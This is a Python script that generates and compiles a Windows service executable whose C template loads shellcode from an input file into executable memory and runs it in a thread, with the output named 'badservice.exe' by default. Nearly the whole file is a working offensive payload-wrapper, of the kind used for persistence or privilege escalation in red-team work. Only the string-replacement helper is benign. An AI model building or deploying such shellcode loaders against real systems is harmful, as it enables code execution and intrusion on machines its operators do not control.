import argparse
import os
import subprocess
import re

SERVICE_TEMPLATE = '''// x86_64-w64-mingw32-gcc -mwindows -O2 -s -o service.exe service.c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

void ServiceControlHandler(DWORD control) {
        switch (control) {
        case SERVICE_CONTROL_PAUSE:
                ServiceStatus.dwCurrentState = SERVICE_PAUSED;
                break;
        case SERVICE_CONTROL_CONTINUE:
                ServiceStatus.dwCurrentState = SERVICE_RUNNING;
                break;
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
                ServiceStatus.dwCurrentState = SERVICE_STOPPED;
                break;
        }
        SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}

void ServiceMain(DWORD argc, LPWSTR* argv) {
        ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
        ServiceStatus.dwWin32ExitCode = NO_ERROR;
        ServiceStatus.dwServiceSpecificExitCode = 0;
        ServiceStatus.dwCheckPoint = 0;
        ServiceStatus.dwWaitHint = 0;

        ServiceStatusHandle = RegisterServiceCtrlHandler(L"SERVICE_NAME", ServiceControlHandler);
        if (ServiceStatusHandle == 0)
                return;

        if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
                return;

        while (ServiceStatus.dwCurrentState != SERVICE_STOPPED) {
                if (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
                        char shellcode[] = { SHELLCODE_CONTENT };
                        int length = SHELLCODE_LENGTH;

                        void* addressPointer = VirtualAlloc(NULL, length+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        memmove(addressPointer, shellcode, length+1);

                        void* handle = CreateThread(NULL, 0, (void*)addressPointer, NULL, 0, 0);
                        WaitForSingleObject(handle, INFINITE);
                }
        }


}

int main() {
        SERVICE_TABLE_ENTRY StartTable[] = { {L"SERVICE_NAME", ServiceMain}, {NULL, NULL} };
        StartServiceCtrlDispatcher(StartTable);
        return 0;
}
'''
SERVICE_REPLACE_DICT = {
        "SERVICE_NAME":"",
        "SHELLCODE_CONTENT":"\\xbe\\xef\\xfe\\xfe",
        "SHELLCODE_LENGTH":"0"
}



def multireplace(string, replacements, ignore_case=False):
        """
        #! This code was taken from a public gist and i claim no credit !#
        #  https://gist.github.com/bgusach/a967e0587d6e01e889fd1d776c5f3729

        Given a string and a replacement map, it returns the replaced string.
        :param str string: string to execute replacements on
        :param dict replacements: replacement dictionary {value to find: value to replace}
        :param bool ignore_case: whether the match should be case insensitive
        :rtype: str
        """
        if not replacements:
                #Edge case that'd produce a funny regex and cause a KeyError
                return string

        # If case insensitive, we need to normalize the old string so that later a replacement
        # can be found. For instance with {"HEY": "lol"} we should match and find a replacement for "hey",
        # "HEY", "hEy", etc.
        if ignore_case:
                def normalize_old(s):
                        return s.lower()
                re_mode = re.IGNORECASE

        else:
                def normalize_old(s):
                        return s

                re_mode = 0

        replacements = {normalize_old(key): val for key, val in replacements.items()}

        # Place longer ones first to keep shorter substrings from matching where the longer ones should take place
        # For instance given the replacements {'ab': 'AB', 'abc': 'ABC'} against the string 'hey abc', it should produce
        # 'hey ABC' and not 'hey ABc'
        rep_sorted = sorted(replacements, key=len, reverse=True)
        rep_escaped = map(re.escape, rep_sorted)

        # Create a big OR regex that matches any of the substrings to replace
        pattern = re.compile("|".join(rep_escaped), re_mode)

        # For each match, look up the new string in the replacements, being the key the normalized old string
        return pattern.sub(lambda match: replacements[normalize_old(match.group(0))], string)

def gen_service():
        SERVICE_REPLACE_DICT['SERVICE_NAME'] = args.name

        with open(args.input,'rb') as sc_file:
                hex_bytes = [f'0x{val}' for val in sc_file.read().hex(' ').split()]

                SERVICE_REPLACE_DICT['SHELLCODE_CONTENT'] = ','.join(hex_bytes)
                SERVICE_REPLACE_DICT['SHELLCODE_LENGTH'] = str(len(hex_bytes))
                sc_file.close()

        tmp_svc = multireplace(SERVICE_TEMPLATE, SERVICE_REPLACE_DICT)

        if os.path.exists('./tmp_service.c'):
                os.remove('./tmp_service.c')

        with open('./tmp_service.c','w') as service_file:
                service_file.write(tmp_svc)
                service_file.close()

        print("service template generated successfully")

def compile():
        if os.path.exists('./tmp_service.c'):
                print("compiling...")
                subprocess.run(["/usr/bin/x86_64-w64-mingw32-gcc","-mwindows","-O2","-s","-o",args.output,"tmp_service.c"], shell=False, stderr=subprocess.DEVNULL) # mingw will likely complain, so STDERR goes to /dev/null
                os.remove('./tmp_service.c')
        else:
                print("'tmp_service.c' file missing - aborting")
                exit()

if __name__ == '__main__':
        parser = argparse.ArgumentParser(prog='shellcode2service.py', add_help = True, description = "Simple Python wrapper for generating a Windows Service executable to run shellcode")
        parser.add_argument('-i','--input', action='store', required=True, help='Input file with raw binary data')
        parser.add_argument('-n','--name', action='store', default='TestingService', help='Name of the service to generate')
        parser.add_argument('-o','--output', action='store', default='badservice.exe', help='Name of the service executable to generate')

        args = parser.parse_args()

        gen_service()
        compile()

        print("done!")
